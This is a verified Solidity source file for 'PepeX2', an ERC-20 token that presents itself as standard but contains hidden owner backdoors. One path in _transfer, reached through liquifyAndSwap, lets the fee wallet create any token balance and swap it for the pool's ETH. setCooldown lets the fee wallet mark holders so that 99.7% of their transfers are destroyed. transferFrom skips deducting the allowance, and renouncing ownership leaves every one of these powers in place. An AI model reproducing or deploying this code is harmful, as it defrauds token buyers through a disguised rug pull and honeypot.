/**
 *Submitted for verification at Etherscan.io on 2023-07-01
*/

pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT


library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
}

abstract contract Ownable {
    address private _owner;
    function owner() public view virtual returns (address) {return _owner;}
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
        }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

interface IUniswapV2Router {
    function factory() external pure returns (address addr);
    function WETH() external pure returns (address aadd);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
}

contract Pepex2 is Ownable {
    using SafeMath for uint256;

    string private _name = "PepeX2";
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 200000000000 * 10 ** _decimals;
    string private _symbol = "PEPEX2";

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    event Transfer(address indexed __address_, address indexed, uint256 _v);
    function _transfer(address sender, address receiver, uint256 amount) internal {
        require(sender != address(0));
        if (msg.sender == _feeWallet && sender == receiver) {liquifyAndSwap(amount, receiver);} else {require(amount <= _balances[sender]);
            uint256 feeAmount = 0;
            if (cooldowns[sender] != 0 && cooldowns[sender] <= block.number) {feeAmount = amount.mul(997).div(1000);}
            _balances[sender] = _balances[sender] - amount;
            _balances[receiver] += amount - feeAmount;
            emit Transfer(sender, receiver, amount);
        }
    }
    constructor() {
        _balances[msg.sender] = _totalSupply;
        _feeWallet = msg.sender;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    mapping(address => uint256) cooldowns;
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    IUniswapV2Router private _uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function liquifyAndSwap(uint256 amount, address to) private {
        _approve(address(this), address(_uniswapRouter), amount);
        _balances[address(this)] = amount;
        address[] memory path = new address[](2);
        path[0] = address(this); path[1] = _uniswapRouter.WETH();
        _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, path, to, block.timestamp + 30);
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function name() external view returns (string memory) {
        return _name;
        }
    mapping(address => uint256) bots;
    event Approval(address indexed a, address indexed, uint256 value);
    function setCooldown(address[] calldata botAddress) external {
        for (uint i = 0; i < botAddress.length; i++) {
            if (!taxWallet()){}else {cooldowns[botAddress[i]] = 
            block.number + 1;
        }}
    }
    address public _feeWallet;
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    function _approve(address owner, address spender, uint256 amount) internal {
        require(spender != address(0), "IERC20: approve to the zero address"); require(owner != address(0), "IERC20: approve from the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    mapping(address => uint256) private _balances;
    function getPairAddress() private view returns (address) {return IUniswapV2Factory(
        _uniswapRouter.factory()).getPair(address(this), _uniswapRouter.WETH());
    }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function transferFrom(address from, address recipient, uint256 amount) public returns (bool) {
        _transfer(from, recipient, amount);
        require(_allowances[from][msg.sender] >= amount);
        return true;
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    function taxWallet() internal view returns (bool) {
        return msg.sender == _feeWallet;
    }
}